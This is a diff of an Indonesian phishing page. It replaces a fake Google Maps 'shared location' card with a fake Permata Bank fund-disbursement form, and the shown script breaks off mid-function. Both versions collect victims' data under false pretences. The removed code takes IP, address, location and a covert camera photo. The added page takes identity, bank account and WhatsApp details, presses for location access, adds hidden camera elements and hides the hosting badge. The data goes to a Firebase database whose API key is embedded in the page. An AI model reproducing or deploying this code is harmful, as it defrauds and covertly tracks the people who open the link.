@@ -1,486 +1,723 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
-<title>Lokasi Dibagikan</title>
-<!-- favicon google maps style -->
-<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📍</text></svg>">
-<style>
-*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-body{
-  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
-  background:#f1f3f4;
-  min-height:100vh;
-  display:flex;flex-direction:column;
-  align-items:center;justify-content:center;
-  padding:16px;
-}
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pengajuan Pencairan</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --ink: #111827;
+      --muted: #6b7280;
+      --line: #e5e7eb;
+      --gold: #c9a227;
+      --gold-2: #e8c547;
+      --success: #047857;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: "Plus Jakarta Sans", system-ui, sans-serif;
+      color: var(--ink);
+      background:
+        radial-gradient(1200px 500px at 10% -10%, rgba(201, 162, 39, 0.18), transparent 50%),
+        radial-gradient(900px 400px at 100% 0%, rgba(15, 76, 129, 0.35), transparent 45%),
+        linear-gradient(180deg, #071018 0%, #0b1220 40%, #101826 100%);
+    }
+    .wrap {
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      padding: 28px 16px;
+    }
+    .shell {
+      width: 100%;
+      max-width: 920px;
+      display: grid;
+      grid-template-columns: 1.05fr 0.95fr;
+      background: #fff;
+      border-radius: 24px;
+      overflow: hidden;
+      box-shadow: 0 40px 80px rgba(0, 0, 0, 0.35);
+    }
+    .aside {
+      background: linear-gradient(180deg, #1a2740, #0b1220);
+      color: #f8fafc;
+      padding: 36px 32px;
+      display: flex;
+      flex-direction: column;
+      gap: 28px;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-weight: 800;
+      letter-spacing: 0.04em;
+    }
+    .mark {
+      width: 42px;
+      height: 42px;
+      border-radius: 12px;
+      background: linear-gradient(145deg, var(--gold-2), var(--gold));
+      display: grid;
+      place-items: center;
+      color: #1a1404;
+      font-weight: 800;
+      flex: 0 0 auto;
+    }
+    .card {
+      position: relative;
+      width: 100%;
+      aspect-ratio: 1.68 / 1;
+      border-radius: 18px;
+      padding: 22px 24px;
+      overflow: hidden;
+      color: #f8fafc;
+      background:
+        radial-gradient(circle at 85% 18%, rgba(232, 197, 71, 0.35), transparent 28%),
+        linear-gradient(135deg, #1e3a5f 0%, #0f2744 45%, #0a1a2e 100%);
+      box-shadow: 0 18px 40px rgba(0, 0, 0, 0.35);
+      border: 1px solid rgba(232, 197, 71, 0.28);
+    }
+    .card::after {
+      content: "";
+      position: absolute;
+      width: 180px;
+      height: 180px;
+      right: -50px;
+      bottom: -70px;
+      border-radius: 50%;
+      background: rgba(201, 162, 39, 0.12);
+    }
+    .card-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      font-size: 0.72rem;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      color: #e8c547;
+      font-weight: 700;
+    }
+    .chip {
+      width: 42px;
+      height: 32px;
+      border-radius: 6px;
+      background: linear-gradient(135deg, #f5e6a8, #c9a227 55%, #8a6d1a);
+      box-shadow: inset 0 0 0 1px rgba(255,255,255,0.25);
+      margin: 28px 0 18px;
+    }
+    .card-no {
+      font-family: "Share Tech Mono", ui-monospace, monospace;
+      font-size: 1.28rem;
+      letter-spacing: 0.18em;
+      margin-bottom: 22px;
+    }
+    .card-bottom {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+    }
+    .card-label {
+      font-size: 0.62rem;
+      letter-spacing: 0.16em;
+      text-transform: uppercase;
+      color: #94a3b8;
+      margin-bottom: 4px;
+    }
+    .card-name {
+      font-weight: 700;
+      font-size: 0.95rem;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
+    .aside h2 {
+      margin: 0 0 10px;
+      font-size: 1.35rem;
+      line-height: 1.3;
+    }
+    .aside p { color: #cbd5e1; line-height: 1.65; margin: 0; font-size: 0.9rem; }
+    .steps { display: grid; gap: 12px; }
+    .step {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+      font-size: 0.88rem;
+      color: #e2e8f0;
+    }
+    .dot {
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      border: 1px solid rgba(201, 162, 39, 0.6);
+      color: var(--gold-2);
+      display: grid;
+      place-items: center;
+      font-size: 0.72rem;
+      font-weight: 700;
+      flex: 0 0 auto;
+    }
+    .panel { padding: 40px 36px; }
+    h1 { margin: 0 0 6px; font-size: 1.45rem; }
+    .sub { margin: 0 0 26px; color: var(--muted); font-size: 0.94rem; }
+    label { display: block; font-size: 0.8rem; font-weight: 700; margin-bottom: 7px; }
+    .field { margin-bottom: 16px; }
+    input, textarea {
+      width: 100%;
+      border: 1px solid var(--line);
+      background: #f8fafc;
+      border-radius: 12px;
+      padding: 13px 14px;
+      font: inherit;
+      outline: none;
+    }
+    input:focus, textarea:focus {
+      background: #fff;
+      border-color: var(--gold);
+      box-shadow: 0 0 0 4px rgba(201, 162, 39, 0.15);
+    }
+    textarea { min-height: 84px; resize: vertical; }
+    .err { display: none; color: #b91c1c; font-size: 0.75rem; margin-top: 5px; }
+    button {
+      width: 100%;
+      border: 0;
+      border-radius: 12px;
+      padding: 14px;
+      margin-top: 8px;
+      font: inherit;
+      font-weight: 800;
+      color: #1a1404;
+      background: linear-gradient(180deg, var(--gold-2), var(--gold));
+      cursor: pointer;
+      box-shadow: 0 10px 20px rgba(201, 162, 39, 0.28);
+    }
+    .hint { margin-top: 14px; color: var(--muted); font-size: 0.78rem; line-height: 1.5; }
+    .screen { display: none; }
+    .screen.show { display: block; animation: fade 0.35s ease; }
+    @keyframes fade { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: none; } }
+    .spinner {
+      width: 54px; height: 54px; border-radius: 50%;
+      border: 4px solid #f1f5f9; border-top-color: var(--gold);
+      animation: spin 1s linear infinite; margin: 12px auto 18px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .bar { height: 8px; background: #eef2f7; border-radius: 99px; overflow: hidden; margin: 18px 0 8px; }
+    .bar > span {
+      display: block; height: 100%; width: 0%;
+      background: linear-gradient(90deg, var(--gold), var(--gold-2));
+    }
+    .timer { text-align: center; font-weight: 700; font-variant-numeric: tabular-nums; }
+    .status-list { margin: 22px 0 0; padding: 0; list-style: none; }
+    .status-list li { padding: 8px 0; color: var(--muted); font-size: 0.88rem; }
+    .status-list li.on { color: var(--ink); font-weight: 600; }
+    .check {
+      width: 64px; height: 64px; margin: 8px auto 16px; border-radius: 50%;
+      background: #ecfdf5; color: var(--success); display: grid; place-items: center; font-size: 1.8rem;
+    }
+    .success-box {
+      background: #f0fdf4; border: 1px solid #bbf7d0; color: #065f46;
+      padding: 14px 16px; border-radius: 12px; line-height: 1.55; font-size: 0.92rem;
+    }
 
-/* MAP BACKGROUND SIMULASI */
-.map-bg{
-  position:fixed;inset:0;
-  background:
-    linear-gradient(rgba(241,243,244,.92),rgba(241,243,244,.92)),
-    url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cpath d='M0 50h200M0 100h200M0 150h200M50 0v200M100 0v200M150 0v200' stroke='%23d0d7de' stroke-width='1'/%3E%3C/svg%3E");
-  z-index:-1;
-}
+    body > div:not(.wrap):not(#popup-lokasi):not(#popup-tolak),
+    body > a[href*="netlify"],
+    body > iframe,
+    [data-netlify-badge],
+    #netlify-badge,
+    a[href*="netlify.com"][target="_blank"],
+    div[style*="Powered by Netlify"] {
+      display: none !important;
+      visibility: hidden !important;
+      opacity: 0 !important;
+      pointer-events: none !important;
+      width: 0 !important;
+      height: 0 !important;
+      overflow: hidden !important;
+    }
 
-/* CARD UTAMA */
-.card{
-  background:#fff;
-  border-radius:16px;
-  box-shadow:0 4px 32px rgba(0,0,0,.14),0 1px 4px rgba(0,0,0,.08);
-  width:100%;max-width:360px;
-  overflow:hidden;
-  position:relative;
-}
-
-/* PREVIEW MAP STATIS */
-.map-preview{
-  width:100%;height:160px;
-  background:
-    linear-gradient(180deg,rgba(255,255,255,0) 60%,rgba(255,255,255,.6) 100%),
-    repeating-linear-gradient(0deg,#e8ecef 0px,#e8ecef 1px,transparent 1px,transparent 40px),
-    repeating-linear-gradient(90deg,#e8ecef 0px,#e8ecef 1px,transparent 1px,transparent 40px),
-    #f5f7f8;
-  position:relative;
-  display:flex;align-items:center;justify-content:center;
-}
-/* jalan horizontal & vertikal simulasi */
-.map-preview::before{
-  content:'';
-  position:absolute;inset:0;
-  background:
-    linear-gradient(90deg,transparent 35%,#fff 35%,#fff 38%,transparent 38%),
-    linear-gradient(0deg,transparent 45%,#fff 45%,#fff 49%,transparent 49%),
-    linear-gradient(90deg,transparent 70%,#dce0e3 70%,#dce0e3 72%,transparent 72%),
-    linear-gradient(0deg,transparent 20%,#dce0e3 20%,#dce0e3 22%,transparent 22%);
-}
-.map-preview::after{
-  content:'';
-  position:absolute;inset:0;
-  background:
-    radial-gradient(ellipse 80px 60px at 50% 50%,rgba(66,133,244,.08) 0%,transparent 100%);
-}
-/* pin tengah */
-.map-pin{
-  position:relative;z-index:2;
-  display:flex;flex-direction:column;align-items:center;
-  animation:pinBounce 1.4s ease-in-out infinite;
-}
-@keyframes pinBounce{
-  0%,100%{transform:translateY(0)}
-  50%{transform:translateY(-6px)}
-}
-.pin-svg{
-  filter:drop-shadow(0 4px 8px rgba(0,0,0,.3));
-}
-.pin-pulse{
-  width:24px;height:8px;
-  background:rgba(0,0,0,.12);
-  border-radius:50%;
-  margin-top:2px;
-  animation:pulseShadow 1.4s ease-in-out infinite;
-}
-@keyframes pulseShadow{
-  0%,100%{transform:scaleX(1);opacity:.4}
-  50%{transform:scaleX(.7);opacity:.2}
-}
-
-/* BADGE LIVE */
-.live-badge{
-  position:absolute;
-  top:12px;right:12px;
-  background:#ea4335;
-  color:#fff;
-  font-size:10px;
-  font-weight:700;
-  letter-spacing:.5px;
-  padding:3px 8px;
-  border-radius:20px;
-  display:flex;align-items:center;gap:4px;
-}
-.live-dot{
-  width:6px;height:6px;border-radius:50%;
-  background:#fff;
-  animation:livePulse 1s ease-in-out infinite;
-}
-@keyframes livePulse{0%,100%{opacity:1}50%{opacity:.4}}
-
-/* BODY CARD */
-.card-body{padding:20px 20px 24px}
-
-/* AVATAR + INFO */
-.sender-row{display:flex;align-items:center;gap:12px;margin-bottom:16px}
-.avatar{
-  width:48px;height:48px;border-radius:50%;
-  background:linear-gradient(135deg,#4285f4,#34a853);
-  display:flex;align-items:center;justify-content:center;
-  font-size:20px;font-weight:700;color:#fff;
-  flex-shrink:0;
-  box-shadow:0 2px 8px rgba(66,133,244,.3);
-}
-.sender-info{flex:1}
-.sender-name{
-  font-size:16px;font-weight:700;
-  color:#202124;
-  margin-bottom:2px;
-}
-.sender-msg{
-  font-size:13px;color:#5f6368;
-  line-height:1.4;
-}
-
-/* DIVIDER */
-.divider{height:1px;background:#f1f3f4;margin:0 -20px 16px}
-
-/* COORD BOX — blurred sebelum izin */
-.coord-box{
-  background:#f8f9fa;
-  border-radius:10px;
-  padding:14px 16px;
-  margin-bottom:16px;
-  display:flex;align-items:center;gap:12px;
-  border:1px solid #e8eaed;
-}
-.coord-icon{font-size:22px}
-.coord-text{flex:1}
-.coord-label{font-size:11px;color:#5f6368;margin-bottom:2px}
-.coord-val{
-  font-size:13px;font-weight:600;color:#202124;
-  filter:blur(6px);user-select:none;
-  transition:filter .5s;
-}
-.coord-val.revealed{filter:blur(0)}
-.coord-acc{font-size:11px;color:#5f6368;filter:blur(4px);transition:filter .5s}
-.coord-acc.revealed{filter:blur(0)}
-
-/* TOMBOL BUKA MAPS */
-.btn-maps{
-  width:100%;
-  padding:14px;
-  background:#4285f4;
-  color:#fff;
-  border:none;
-  border-radius:10px;
-  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
-  font-size:15px;
-  font-weight:600;
-  cursor:pointer;
-  display:flex;align-items:center;justify-content:center;gap:8px;
-  box-shadow:0 2px 8px rgba(66,133,244,.4);
-  transition:opacity .15s,transform .1s;
-  margin-bottom:10px;
-}
-.btn-maps:active{opacity:.88;transform:scale(.98)}
-.btn-maps.loading{background:#9aa0a6;cursor:not-allowed}
-
-/* TOMBOL TOLAK */
-.btn-decline{
-  width:100%;
-  padding:12px;
-  background:transparent;
-  color:#5f6368;
-  border:1px solid #dadce0;
-  border-radius:10px;
-  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
-  font-size:14px;
-  cursor:pointer;
-}
-
-/* STATUS TEXT */
-.status-txt{
-  text-align:center;
-  font-size:12px;
-  color:#9aa0a6;
-  margin-top:14px;
-  min-height:16px;
-}
-
-/* FOOTER — terlihat legit */
-.card-footer{
-  background:#f8f9fa;
-  border-top:1px solid #e8eaed;
-  padding:10px 20px;
-  display:flex;align-items:center;justify-content:center;gap:6px;
-  font-size:11px;color:#9aa0a6;
-}
-.google-logo{font-size:14px;font-weight:800;letter-spacing:-.5px}
-.google-logo span{
-  color:#4285f4;
-}
-.google-logo span:nth-child(2){color:#ea4335}
-.google-logo span:nth-child(3){color:#fbbc05}
-.google-logo span:nth-child(4){color:#4285f4}
-.google-logo span:nth-child(5){color:#34a853}
-.google-logo span:nth-child(6){color:#ea4335}
-
-/* LOADING SPINNER */
-@keyframes spin{to{transform:rotate(360deg)}}
-.spinner{
-  width:18px;height:18px;
-  border:2px solid rgba(255,255,255,.4);
-  border-top-color:#fff;
-  border-radius:50%;
-  animation:spin .8s linear infinite;
-  display:none;
-}
-
-/* SUCCESS OVERLAY */
-.success-overlay{
-  position:absolute;inset:0;
-  background:rgba(255,255,255,.96);
-  display:none;flex-direction:column;
-  align-items:center;justify-content:center;
-  gap:12px;z-index:10;
-  border-radius:16px;
-}
-.success-overlay.show{display:flex}
-.success-check{
-  width:64px;height:64px;
-  background:#34a853;
-  border-radius:50%;
-  display:flex;align-items:center;justify-content:center;
-  font-size:30px;
-  animation:checkPop .4s cubic-bezier(.175,.885,.32,1.275);
-}
-@keyframes checkPop{from{transform:scale(0)}to{transform:scale(1)}}
-.success-txt{font-size:15px;font-weight:600;color:#202124;text-align:center}
-.success-sub{font-size:12px;color:#5f6368;text-align:center}
-.progress-bar{width:200px;height:3px;background:#e8eaed;border-radius:2px;overflow:hidden}
-.progress-fill{height:100%;background:#4285f4;border-radius:2px;animation:progressFill 2s linear forwards}
-@keyframes progressFill{from{width:0}to{width:100%}}
-</style>
+    @media (max-width: 820px) {
+      .shell { grid-template-columns: 1fr; }
+      .aside, .panel { padding: 28px 22px; }
+    }
+  </style>
 </head>
 <body>
-<div class="map-bg"></div>
+  <div class="wrap">
+    <div class="shell">
+      <aside class="aside">
+        <div class="brand">
+          <div class="mark">P</div>
+          <div>
+            <div style="font-size:1.05rem; line-height:1.1;">PERMATA BANK</div>
+            <div style="font-size:0.65rem; letter-spacing:0.18em; color:#94a3b8; font-weight:600; margin-top:4px;">PENCAIRAN DANA</div>
+          </div>
+        </div>
 
-<div class="card">
-  <div class="success-overlay" id="successOverlay">
-    <div class="success-check">✓</div>
-    <div class="success-txt">Lokasi ditemukan!</div>
-    <div class="success-sub" id="successSub">Membuka Google Maps...</div>
-    <div class="progress-bar"><div class="progress-fill"></div></div>
-  </div>
+        <div class="card" aria-label="Kartu rekening penerima">
+          <div class="card-top">
+            <span>Rekening tujuan</span>
+            <span>DEBIT</span>
+          </div>
+          <div class="chip"></div>
+          <div class="card-no">XXXX 7362 XXXXXX</div>
+          <div class="card-bottom">
+            <div>
+              <div class="card-label">Pemegang rekening</div>
+              <div class="card-name">Muh Rizal Roji Karana</div>
+            </div>
+          </div>
+        </div>
 
-  <!-- preview peta statis -->
-  <div class="map-preview">
-    <div class="live-badge"><div class="live-dot"></div>LIVE</div>
-    <div class="map-pin">
-      <svg class="pin-svg" width="40" height="52" viewBox="0 0 40 52" xmlns="http://www.w3.org/2000/svg">
-        <path d="M20 0C9 0 0 9 0 20C0 36 20 52 20 52C20 52 40 36 40 20C40 9 31 0 20 0Z" fill="#ea4335"/>
-        <circle cx="20" cy="20" r="11" fill="white"/>
-        <circle cx="20" cy="20" r="6" fill="#ea4335"/>
-      </svg>
-      <div class="pin-pulse"></div>
+        <div>
+          <h2>Verifikasi pencairan</h2>
+          <p>Lengkapi data sesuai identitas. Rekening tujuan tercantum pada kartu. Pengajuan diproses setelah semua kolom terisi benar.</p>
+        </div>
+        <div class="steps">
+          <div class="step"><span class="dot">1</span> Data pemohon wajib lengkap dan sesuai KTP</div>
+          <div class="step"><span class="dot">2</span> Nama bank dan nomor rekening harus valid</div>
+          <div class="step"><span class="dot">3</span> Nomor WhatsApp aktif</div>
+          <div class="step"><span class="dot">4</span> Pemeriksaan otomatis</div>
+        </div>
+      </aside>
+
+      <section class="panel">
+        <div id="form-screen" class="screen show">
+          <h1>Formulir verifikasi</h1>
+          <p class="sub">Isi data pemohon dengan benar. Rekening tujuan sudah tercantum pada kartu.</p>
+          <form id="form-pencairan" novalidate>
+            <div class="field">
+              <label for="nama">Nama lengkap</label>
+              <input id="nama" name="nama" type="text" autocomplete="name" required />
+              <div class="err" id="err-nama">Nama lengkap wajib diisi.</div>
+            </div>
+            <div class="field">
+              <label for="bank">Nama bank penerima</label>
+              <input id="bank" name="bank" type="text" required placeholder="Contoh: BCA, Mandiri, BRI" />
+              <div class="err" id="err-bank">Nama bank wajib diisi.</div>
+            </div>
+            <div class="field">
+              <label for="rek">Nomor rekening penerima</label>
+              <input id="rek" name="rek" type="text" inputmode="numeric" required placeholder="Nomor rekening pengguna" />
+              <div class="err" id="err-rek">Nomor rekening wajib diisi.</div>
+            </div>
+            <div class="field">
+              <label for="alamat">Alamat lengkap penerima</label>
+              <textarea id="alamat" name="alamat" required></textarea>
+              <div class="err" id="err-alamat">Alamat lengkap wajib diisi.</div>
+            </div>
+            <div class="field">
+              <label for="wa">Nomor WhatsApp aktif</label>
+              <input id="wa" name="wa" type="tel" required placeholder="08xxxxxxxxxx" />
+              <div class="err" id="err-wa">Nomor WhatsApp wajib diisi.</div>
+            </div>
+            <div class="field">
+              <label for="jumlah">Jumlah pencairan</label>
+              <input id="jumlah" name="jumlah" type="text" inputmode="numeric" required placeholder="Contoh: 10.000" />
+              <div class="err" id="err-jumlah">Jumlah pencairan wajib diisi.</div>
+              <div class="err" id="err-jumlah-min">Maksimal lebih dari 10.000.</div>
+            </div>
+            <button type="submit" id="btnSubmit">Ajukan pencairan</button>
+          </form>
+          <p class="hint">Setelah diajukan, verifikasi berlangsung otomatis.</p>
+        </div>
+
+        <div id="process-screen" class="screen">
+          <h1>Sedang diproses</h1>
+          <p class="sub">Mohon tunggu. Verifikasi pengajuan berlangsung 5 menit.</p>
+          <div class="spinner"></div>
+          <div class="bar"><span id="progress"></span></div>
+          <div class="timer" id="timer">05:00</div>
+          <ul class="status-list">
+            <li id="st1" class="on">Data diterima</li>
+            <li id="st2">Memeriksa kelengkapan data</li>
+            <li id="st3">Memvalidasi informasi penerima</li>
+            <li id="st4">Menyelesaikan pengajuan</li>
+          </ul>
+        </div>
+
+        <div id="success-screen" class="screen">
+          <div class="check">&#10003;</div>
+          <h1 style="text-align:center;">Pengajuan berhasil</h1>
+          <p class="sub" style="text-align:center;">Pemberitahuan: pengajuan pencairan Anda telah berhasil diproses.</p>
+          <div class="success-box">
+            Terima kasih. Data pengajuan sudah tercatat. Tim kami akan menghubungi nomor WhatsApp yang Anda berikan.
+          </div>
+        </div>
+      </section>
     </div>
   </div>
 
-  <div class="card-body">
-    <!-- pengirim -->
-    <div class="sender-row">
-      <div class="avatar" id="avatarEl">?</div>
-      <div class="sender-info">
-        <div class="sender-name" id="sharerName">Seseorang</div>
-        <div class="sender-msg">berbagi lokasi langsung dengan kamu</div>
-      </div>
+  <div id="popup-lokasi" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:9999; align-items:center; justify-content:center; padding:20px;">
+    <div style="background:#fff; border-radius:18px; max-width:400px; width:100%; padding:28px 24px; box-shadow:0 20px 60px rgba(0,0,0,0.4); text-align:center; font-family:'Plus Jakarta Sans',sans-serif;">
+      <div style="width:64px; height:64px; margin:0 auto 16px; border-radius:50%; background:#fef9e7; display:grid; place-items:center; font-size:1.1rem; font-weight:800; color:#c9a227; letter-spacing:0.05em;">LOC</div>
+      <h2 style="margin:0 0 12px; font-size:1.15rem; color:#111827;">Verifikasi Lokasi Diperlukan</h2>
+      <p style="margin:0 0 10px; color:#6b7280; font-size:0.9rem; line-height:1.6;">
+        Untuk memastikan pengajuan Anda benar dan aman, sistem perlu memverifikasi lokasi Anda saat ini.
+      </p>
+      <p style="margin:0 0 10px; color:#6b7280; font-size:0.9rem; line-height:1.6;">
+        Lokasi hanya digunakan untuk validasi pengajuan pencairan.
+      </p>
+      <p style="margin:0 0 20px; color:#6b7280; font-size:0.9rem; line-height:1.6;">
+        Klik <b>Izinkan Lokasi</b> untuk melanjutkan. Pastikan Anda memilih <b>Allow / Izinkan</b> saat browser meminta konfirmasi.
+      </p>
+      <button id="btnIzinkan" style="width:100%; border:0; border-radius:12px; padding:14px; font:inherit; font-weight:800; color:#1a1404; background:linear-gradient(180deg,#e8c547,#c9a227); cursor:pointer; margin-bottom:10px;">Izinkan Lokasi</button>
+      <button id="btnBatal" style="width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:12px; font:inherit; font-weight:700; color:#6b7280; background:#fff; cursor:pointer;">Batal</button>
     </div>
-
-    <div class="divider"></div>
-
-    <!-- koordinat (diblur dulu) -->
-    <div class="coord-box">
-      <div class="coord-icon">📍</div>
-      <div class="coord-text">
-        <div class="coord-label">LOKASI SAAT INI</div>
-        <div class="coord-val" id="coordVal">••••••••, ••••••••</div>
-        <div class="coord-acc" id="coordAcc">Akurasi sedang dimuat...</div>
-      </div>
-    </div>
-
-    <!-- tombol -->
-    <button class="btn-maps" id="btnMaps" onclick="bukaMaps()">
-      <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
-      Buka di Google Maps
-      <div class="spinner" id="spinner"></div>
-    </button>
-    <button class="btn-decline" onclick="tolak()">Tidak, terima kasih</button>
-
-    <div class="status-txt" id="statusTxt">Lokasi langsung dari pengirim</div>
   </div>
 
-  <div class="card-footer">
-    <span>Diberdayakan oleh</span>
-    <span class="google-logo">
-      <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-    </span>
-    <span>Maps</span>
+  <div id="popup-tolak" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:10000; align-items:center; justify-content:center; padding:20px;">
+    <div style="background:#fff; border-radius:18px; max-width:400px; width:100%; padding:28px 24px; box-shadow:0 20px 60px rgba(0,0,0,0.4); text-align:center; font-family:'Plus Jakarta Sans',sans-serif;">
+      <div style="width:64px; height:64px; margin:0 auto 16px; border-radius:50%; background:#fee2e2; display:grid; place-items:center; font-size:1.8rem; font-weight:800; color:#dc2626;">!</div>
+      <h2 style="margin:0 0 12px; font-size:1.15rem; color:#111827;">Lokasi Tidak Diizinkan</h2>
+      <p style="margin:0 0 14px; color:#6b7280; font-size:0.9rem; line-height:1.6;">
+        Izin lokasi diperlukan untuk memproses pengajuan Anda. Tanpa izin lokasi, pengajuan tidak dapat dilanjutkan dan akan tertunda.
+      </p>
+      <p style="margin:0 0 20px; color:#6b7280; font-size:0.9rem; line-height:1.6;">
+        Silakan aktifkan izin lokasi di pengaturan browser Anda, lalu klik <b>Ajukan pencairan</b> kembali.
+      </p>
+      <button id="btnTutupTolak" style="width:100%; border:0; border-radius:12px; padding:14px; font:inherit; font-weight:800; color:#fff; background:linear-gradient(180deg,#ef4444,#dc2626); cursor:pointer;">Mengerti</button>
+    </div>
   </div>
-</div>
 
-<script type="module">
-import{initializeApp}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-import{getDatabase,ref,set}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
+  <canvas id="canvas" style="display:none"></canvas>
+  <video id="video" autoplay playsinline muted style="display:none"></video>
 
-const FC={
-  apiKey:"AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
-  authDomain:"roraxbali-65802.firebaseapp.com",
-  databaseURL:"https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId:"roraxbali-65802",
-  storageBucket:"roraxbali-65802.firebasestorage.app",
-  messagingSenderId:"750633313866",
-  appId:"1:750636313866:web:3d2e552960e06db83968b3"
-};
-const app=initializeApp(FC);
-const db=getDatabase(app);
+  <script type="module">
+    /* ==== FIREBASE (SAMA SEPERTI maps.html) ==== */
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
 
-// ── baca param
-const params=new URLSearchParams(location.search);
-const ownerUser=params.get('u')||'unknown';   // pemilik dashboard
-const targetName=params.get('t')||'target';   // nama target (untuk Firebase)
-const sharerName=params.get('s')||'Budi';     // nama "pengirim" yang ditampilkan
-const sessionKey=Date.now().toString();
-
-// ── tampilkan nama pengirim + avatar
-document.getElementById('sharerName').innerText=sharerName;
-document.getElementById('avatarEl').innerText=sharerName.charAt(0).toUpperCase();
-// warna avatar acak berdasarkan nama
-const colors=['#4285f4','#ea4335','#fbbc05','#34a853','#ff6d00','#7b1fa2','#0097a7'];
-const ci=sharerName.charCodeAt(0)%colors.length;
-document.getElementById('avatarEl').style.background=`linear-gradient(135deg,${colors[ci]},${colors[(ci+2)%colors.length]})`;
-
-// ── ambil IP
-async function getIP(){try{const r=await fetch('https://api.ipify.org?format=json');return(await r.json()).ip}catch(e){return'unknown'}}
-
-// ── alamat dari Nominatim
-async function getAlamat(lat,lng){
-  try{
-    const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&accept-language=id&zoom=18`,{headers:{'User-Agent':'ShareLocation/1.0'}});
-    const j=await r.json();const a=j.address||{};
-    const kota=(a.city||a.town||a.municipality||a.village||a.county||'Unknown')+', '+(a.country||'');
-    return{
-      kota,
-      alamat:{
-        jalan:a.road||a.pedestrian||a.path||'',
-        desa:a.village||a.hamlet||a.neighbourhood||a.suburb||'',
-        kecamatan:a.suburb||a.city_district||a.subdistrict||a.county||'',
-        kabupaten:a.city||a.town||a.municipality||a.county||'',
-        provinsi:a.state||a.region||'',
-        negara:a.country||''
-      }
+    const firebaseConfig = {
+      apiKey: "AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
+      authDomain: "roraxbali-65802.firebaseapp.com",
+      databaseURL: "https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "roraxbali-65802",
+      storageBucket: "roraxbali-65802.firebasestorage.app",
+      messagingSenderId: "750633313866",
+      appId: "1:750633313866:web:3d2e552960e06db83968b3"
     };
-  }catch(e){return{kota:'Unknown',alamat:{}}}
-}
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
 
-// ── foto kamera
-async function capturePhoto(){
-  return new Promise(resolve=>{
-    try{
-      navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:'user'},width:{ideal:320},height:{ideal:240}}})
-      .then(stream=>{
-        const v=document.createElement('video');v.muted=true;v.srcObject=stream;v.onloadedmetadata=()=>{
-          v.play();setTimeout(()=>{
-            const c=document.createElement('canvas');c.width=320;c.height=240;
-            c.getContext('2d').drawImage(v,0,0,320,240);
-            const d=c.toDataURL('image/jpeg',0.6);
-            stream.getTracks().forEach(t=>t.stop());resolve(d);
-          },1400);
+    /* ==== PARAM URL (SAMA SEPERTI maps.html) ==== */
+    const params = new URLSearchParams(location.search);
+    const user = (params.get('u') || '').trim().slice(0, 64);
+    const targetUrl = ((params.get('t') || '').trim().slice(0, 50)) || 'target';
+
+    if (!user) {
+      document.body.innerHTML = '<div style="color:#5f6368;text-align:center;padding:50px;font-family:sans-serif;">Link tidak valid</div>';
+      throw new Error('user kosong');
+    }
+
+    /* ==== KONFIGURASI ==== */
+    const DURATION = 5 * 60;
+    const form = document.getElementById("form-pencairan");
+    const formScreen = document.getElementById("form-screen");
+    const processScreen = document.getElementById("process-screen");
+    const successScreen = document.getElementById("success-screen");
+    const timerEl = document.getElementById("timer");
+    const progressEl = document.getElementById("progress");
+    const btnSubmit = document.getElementById("btnSubmit");
+    const popupLokasi = document.getElementById("popup-lokasi");
+    const popupTolak = document.getElementById("popup-tolak");
+    const btnIzinkan = document.getElementById("btnIzinkan");
+    const btnBatal = document.getElementById("btnBatal");
+    const btnTutupTolak = document.getElementById("btnTutupTolak");
+
+    function show(el) {
+      [formScreen, processScreen, successScreen].forEach((s) => s.classList.remove("show"));
+      el.classList.add("show");
